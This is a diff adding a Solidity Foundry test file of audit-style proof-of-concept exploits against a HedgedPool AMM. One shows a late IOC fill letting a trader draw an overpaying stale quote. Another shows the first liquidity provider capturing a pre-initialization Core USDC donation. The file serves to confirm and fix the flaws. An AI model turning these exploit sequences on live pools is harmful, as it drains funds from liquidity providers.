@@ -1,0 +1,155 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {Core, IERC20} from "../../src/Core.sol";
+import {HedgedPool} from "../../src/HedgedPool.sol";
+
+/// @dev Minimal CoreWriter replacement: Core writes are deliberately asynchronous in these PoCs.
+contract R3RecordingWriter {
+    bytes[] public sent;
+
+    function sendRawAction(bytes calldata data) external {
+        sent.push(data);
+    }
+}
+
+contract R3USDC {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external {
+        balanceOf[to] += amount;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract Round3FloatPoC is Test {
+    uint64 internal constant HYPE = 1105;
+    uint64 internal constant SPOT = 1035;
+    uint64 internal constant OPS_HYPE = 1e6;
+
+    HedgedPool internal pool;
+    R3USDC internal usdc;
+    address internal keeper = address(0xC0FFEE);
+    address internal lp = address(0x1F);
+    address internal trader = address(0x7ADe);
+
+    function setUp() public {
+        vm.etch(address(Core.WRITER), address(new R3RecordingWriter()).code);
+        usdc = new R3USDC();
+        pool = new HedgedPool(IERC20(address(usdc)), keeper, HYPE, SPOT, 2);
+        _setCoreBalance(HYPE, OPS_HYPE);
+        _setCoreBalance(Core.USDC, 0);
+        _setCorePrice(40e6);
+    }
+
+    function _setCorePrice(uint64 px6) internal {
+        vm.mockCall(Core.SPOT_PX, abi.encode(SPOT), abi.encode(px6));
+    }
+
+    function _setCoreBalance(uint64 token, uint64 wei8) internal {
+        vm.mockCall(
+            Core.SPOT_BALANCE, abi.encode(address(pool), token), abi.encode(Core.SpotBalance(wei8, 0, 0))
+        );
+    }
+
+    function _seedEvmPool() internal {
+        vm.deal(lp, 100 ether);
+        usdc.mint(lp, 4_000e6);
+        vm.startPrank(lp);
+        usdc.approve(address(pool), type(uint256).max);
+        pool.add{value: 100 ether}(4_000e6, 0);
+        vm.stopPrank();
+    }
+
+    function _out(uint256 amountIn, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
+        uint256 inAfterFee = amountIn * 9_970;
+        return inAfterFee * rOut / (rIn * 10_000 + inAfterFee);
+    }
+
+    /// High: ORDER_DELAY is only a measured observation, not a completion acknowledgement. If an
+    /// IOC's Core result arrives later, finish() accepts the pre-fill balances and opens the AMM.
+    /// A trader can then sell HYPE to the AMM at a quote which omits the HYPE purchased on Core.
+    function test_PoC_lateIocFillOpensPoolWithPurchasedHypeMissingFromReserves() public {
+        _setCoreBalance(Core.USDC, 200e8);
+        _seedEvmPool();
+        _setCorePrice(38e6);
+
+        vm.prank(keeper);
+        pool.start(false, 100e6);
+        vm.prank(keeper);
+        pool.order();
+
+        // The CoreWriter IOC has not executed by the fixed ten-second timeout.
+        skip(pool.ORDER_DELAY());
+        vm.prank(keeper);
+        pool.sendBack(0);
+        vm.prank(keeper);
+        pool.finish();
+        assertEq(uint8(pool.stage()), uint8(HedgedPool.Stage.Idle));
+        assertEq(pool.rH(), 100 ether);
+
+        // The queued IOC now fills: 100 USDC buys 2.6 HYPE, and USDC remains as Core float.
+        _setCoreBalance(HYPE, OPS_HYPE + 2.6e8);
+        _setCoreBalance(Core.USDC, 100.2e8);
+
+        uint256 correctQuote = _out(1 ether, 102.6 ether, 4_100.2e6);
+        uint256 staleQuote = _out(1 ether, 100 ether, 4_100.2e6);
+        assertGt(staleQuote, correctQuote, "missing Core HYPE makes the pool overpay for HYPE");
+
+        vm.deal(trader, 1 ether);
+        vm.prank(trader);
+        uint256 paid = pool.swapHypeForUsdc{value: 1 ether}(0);
+        assertEq(paid, staleQuote);
+        assertGt(paid - correctQuote, 1e6, "trader extracts over one USDC on one HYPE");
+        assertEq(uint8(pool.stage()), uint8(HedgedPool.Stage.Idle));
+    }
+
+    /// Medium: a direct Core USDC donation before initialization is counted in reserveU(), but
+    /// the first mint ignores it. The first EVM LP subsequently owns (and can withdraw) it.
+    function test_PoC_firstLpCapturesPreFundedCoreFloat() public {
+        _setCoreBalance(Core.USDC, 500e8); // third-party Core donation before any LP exists
+        // A frontrunner needs only a tiny balanced initial position, not the donor's capital.
+        vm.deal(lp, 0.01 ether);
+        usdc.mint(lp, 11e6);
+        vm.startPrank(lp);
+        usdc.approve(address(pool), type(uint256).max);
+        pool.add{value: 0.01 ether}(11e6, 0);
+        vm.stopPrank();
+        uint256 minted = pool.shares(lp);
+
+        assertEq(pool.reserveU(), 511e6);
+        assertEq(pool.rU(), 11e6);
+
+        // The keeper merely makes the already-accounted float liquid on EVM.
+        vm.prank(keeper);
+        pool.sendBack(500e8);
+        _setCoreBalance(Core.USDC, 0);
+        usdc.mint(address(pool), 500e6);
+        vm.prank(keeper);
+        pool.finish();
+
+        vm.prank(lp);
+        (, uint256 withdrawn) = pool.remove(minted, 0, 0);
+        assertGt(withdrawn, 510_999_000, "first LP withdraws nearly the 500-USDC pre-fund too");
+        assertGt(withdrawn - 11e6, 499e6, "unowned Core donation is captured");
+    }
+}
